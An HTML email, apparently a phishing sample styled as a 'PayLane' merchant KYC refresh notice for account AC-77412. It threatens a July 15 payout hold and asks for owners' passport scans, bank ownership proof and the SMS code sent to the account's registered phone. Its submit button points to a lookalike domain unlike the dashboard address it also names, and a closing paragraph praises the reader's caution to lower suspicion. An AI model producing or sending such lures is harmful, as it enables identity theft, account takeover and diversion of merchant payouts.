<p style="background:#FFEBEE;border-left:4px solid #B71C1C;padding:12px">
<b>ANNUAL KYC REFRESH — MERCHANT ACCOUNT AC-77412.</b>
Your PayLane merchant account enters its annual compliance review (cycle 2027). Updated KYC
documentation must be on file <b>before the July payout cycle (July 15)</b> — accounts with
expired KYC enter <b>regulatory funds hold</b>: incoming charges keep processing, but payouts
pause until the review clears. Your June payout volume was <b>USD 486,200</b>; a hold delays
every cycle until cleared.
</p>

<h3>1. Account &amp; Review Status</h3>
<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
<tr><td style="background:#f5f5f5;width:270px">Merchant account</td><td><b>AC-77412</b> (e-commerce, since 2021)</td></tr>
<tr><td style="background:#f5f5f5">June payout volume</td><td>USD 486,200 (avg. settlement T+2)</td></tr>
<tr><td style="background:#f5f5f5">Review type</td><td>Annual KYC refresh (beneficial ownership re-verification)</td></tr>
<tr><td style="background:#f5f5f5">KYC expiry</td><td>2027-07-14 (documents from 2024 cycle)</td></tr>
<tr><td style="background:#f5f5f5">Payout hold trigger</td><td><b>July 15 cycle</b> if review incomplete</td></tr>
</table>

<h3>2. KYC Refresh Package</h3>
<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
<tr style="background:#f0f0f0"><th>Item</th><th>Detail</th></tr>
<tr><td>Beneficial-owner ID</td><td>Passport or national ID (bio page) for each 25%+ shareholder — new since 2024 cycle</td></tr>
<tr><td>Payout bank re-verification</td><td>Account number + bank-issued ownership proof + <b>mobile SMS code to the account's registered number</b> (payment-services re-verification rule)</td></tr>
<tr><td>Registered address proof</td><td>Utility bill or bank statement (within 3 months)</td></tr>
<tr><td>Expedited review (optional)</td><td>48h processing vs standard 5-7 days — USD 149</td></tr>
</table>

<h3>3. Submission Portal</h3>
<p style="text-align:center;margin:18px 0">
<a href="https://pl-merchant.example/kyc/AC-77412/refresh" style="display:inline-block;background:#0052CC;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Submit KYC Refresh Package</a>
</p>
<p style="font-size:13px;color:#666;text-align:center">Merchant dashboard: https://dashboard.paylane.example/compliance (review status, same login)</p>

<h3>4. What the Hold Means</h3>
<ul>
<li>Charges keep processing; payouts pause (June's USD 486,200 settlement pattern interrupted)</li>
<li>Hold releases within 48h of completed review — the expedited option guards the July 15 cycle</li>
<li>Two consecutive held cycles trigger enhanced monitoring (per-transaction review)</li>
</ul>

<p style="font-size:14px;background:#FFF3E0;padding:12px">A payments provider emailing for passports
and payout-bank re-verification deserves your hardest look — merchant-account phishes are how
payout redirections happen, and your caution is exactly right. Checks: the review status ("KYC
expiring") is on your merchant dashboard (address above); the account numbers match your onboarding
records; and your account manager can confirm the 2027 cycle scope on your quarterly call. The
July 15 hold is the licensing calendar, not a negotiation — but nothing in the flow should ever
ask for your dashboard password or full card numbers.</p>

